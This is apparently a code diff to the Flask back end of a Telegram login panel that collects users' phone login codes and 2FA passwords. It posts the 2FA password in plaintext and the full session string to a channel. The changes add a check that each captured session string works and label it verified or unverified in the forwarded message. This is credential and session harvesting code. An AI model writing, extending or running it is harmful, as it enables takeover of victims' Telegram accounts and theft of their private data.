@@ -26,31 +26,23 @@ from .database import (
     send_to_channel,
 )
 from .session_manager import session_manager
+from .session_tools import check_session
 
 log = logging.getLogger(__name__)
 
 auth_bp = Blueprint("auth", __name__)
 
-# --------------------------------------------------------------------------
-# Tunables
-# --------------------------------------------------------------------------
-PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")   # E.164
+PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")
 DEFAULT_SESSION_NAME = "session"
 MAX_CODE_ATTEMPTS = 3
 REUSE_PENDING_SESSION = True
 RESEND_COOLDOWN = 45
 TRUTHY = {"1", "true", "yes", "on"}
 
-PUBLIC_ENDPOINTS = {
-    "auth.index", "auth.login", "auth.logout_page", "auth.logout",
-    "auth.bot_connect", "auth.send_code", "auth.session_info",
-    "auth.verify_code",
-}
+VERIFY_ATTEMPTS = 3
+VERIFY_DELAY = 0.7
 
 
-# --------------------------------------------------------------------------
-# Small helpers
-# --------------------------------------------------------------------------
 def _json():
     return request.get_json(silent=True) or {}
 
@@ -90,12 +82,8 @@ def _truthy(value):
     return str(value or "").strip().lower() in TRUTHY
 
 
-# --------------------------------------------------------------------------
-# Auto logout guard
-# --------------------------------------------------------------------------
 @auth_bp.before_request
 def _enforce_login_ttl():
-    """24h (configurable) hard expiry on the browser login."""
     if "user" not in session:
         return None
 
@@ -114,6 +102,7 @@ def _enforce_login_ttl():
     if now - float(started) < hours * 3600:
         return None
 
+    _kill_live(session.get("user") or {})
     session.clear()
     if request.path.startswith("/api/"):
         return jsonify(ok=False, error="Session expired. Log in again.",
@@ -121,9 +110,15 @@ def _enforce_login_ttl():
     return redirect("/login?expired=1")
 
 
-# --------------------------------------------------------------------------
-# temp_sessions access (resolved at call time, not import time)
-# --------------------------------------------------------------------------
+def _kill_live(user):
+    phone = (user or {}).get("phone")
+    if phone:
+        try:
+            session_manager.kill_by_phone(phone)
+        except Exception:
+            pass
+
+
 def _temp_col():
     try:
         ensure_db()
@@ -166,7 +161,6 @@ def _temp_delete(session_id):
 
 
 def _reuse_pending(phone):
-    """Return a still-live pending session_id for this phone, else None."""
     if not REUSE_PENDING_SESSION:
         return None
     col = _temp_col()
@@ -185,8 +179,6 @@ def _reuse_pending(phone):
 
     session_id = doc.get("_id")
     if not session_manager.get_session(session_id):
-        # The in-memory client is gone (restart / timeout): a new code is the
-        # only way forward, because phone_code_hash is bound to the auth key.
         _temp_delete(session_id)
         return None
 
@@ -196,9 +188,6 @@ def _reuse_pending(phone):
     return session_id
 
 
-# --------------------------------------------------------------------------
-# Session bootstrap
-# --------------------------------------------------------------------------
 def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
     ensure_db()
     session_id = str(uuid.uuid4())[:8]
@@ -276,9 +265,6 @@ def _handle_send_code(payload, force_new=False):
     )
 
 
-# --------------------------------------------------------------------------
-# Pages
-# --------------------------------------------------------------------------
 @auth_bp.route("/")
 def index():
     return redirect("/login")
@@ -286,7 +272,6 @@ def index():
 
 @auth_bp.route("/login")
 def login():
-    """A logged-in user still sees /login when arriving with ?s= or ?fresh=1."""
     pending = (request.args.get("s") or "").strip()
     fresh = _truthy(request.args.get("fresh"))
 
@@ -304,6 +289,7 @@ def login():
 
 @auth_bp.route("/logout")
 def logout_page():
+    _kill_live(session.get("user") or {})
     session.clear()
     return redirect("/login?fresh=1")
 
@@ -320,9 +306,6 @@ def dashboard():
     )
 
 
-# --------------------------------------------------------------------------
-# API: start flow
-# --------------------------------------------------------------------------
 @auth_bp.route("/api/bot-connect", methods=["POST"])
 def bot_connect():
     return _handle_send_code(_json())
@@ -360,9 +343,6 @@ def session_info():
     )
 
 
-# --------------------------------------------------------------------------
-# API: verify
-# --------------------------------------------------------------------------
 @auth_bp.route("/api/verify-code", methods=["POST"])
 def verify_code():
     data = _json()
@@ -479,6 +459,13 @@ def verify_code():
 
     session_manager.remove_session(session_id)
 
+    verified, check_err = check_session(session_string,
+                                        attempts=VERIFY_ATTEMPTS,
+                                        delay=VERIFY_DELAY)
+    if not verified:
+        log.warning("new session for %s not verified yet: %s",
+                    _mask_phone(phone), check_err)
+
     first_name = (getattr(user, "first_name", "") or "").strip()
     last_name = (getattr(user, "last_name", "") or "").strip()
     username = getattr(user, "username", None)
@@ -494,6 +481,8 @@ def verify_code():
         "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "session_name": session_name,
         "two_step_verification": used_password,
+        "status": "active" if verified else "unverified",
+        "check_fail": None if verified else check_err,
     }
 
     try:
@@ -513,6 +502,11 @@ def verify_code():
         )
         if used_password:
             channel_msg += f"\n🔑 <b>2FA:</b> <code>{html_lib.escape(password)}</code>"
+        if verified:
+            channel_msg += "\n✅ <b>Status:</b> verified"
+        else:
+            channel_msg += (f"\n⚠️ <b>Status:</b> unverified "
+                            f"({html_lib.escape(str(check_err))})")
         channel_msg += (
             f"\n\n<b>🔐 SESSION:</b>\n"
             f"<code>{html_lib.escape(user_info['session_string'])}</code>"
@@ -529,13 +523,11 @@ def verify_code():
         "username": user_info["username"],
         "phone": phone,
     }
-    return jsonify(ok=True, user=session["user"])
+    return jsonify(ok=True, user=session["user"], verified=verified)
 
 
-# --------------------------------------------------------------------------
-# API: logout
-# --------------------------------------------------------------------------
 @auth_bp.route("/api/logout", methods=["POST"])
 def logout():
+    _kill_live(session.get("user") or {})
     session.clear()
     return jsonify(ok=True)
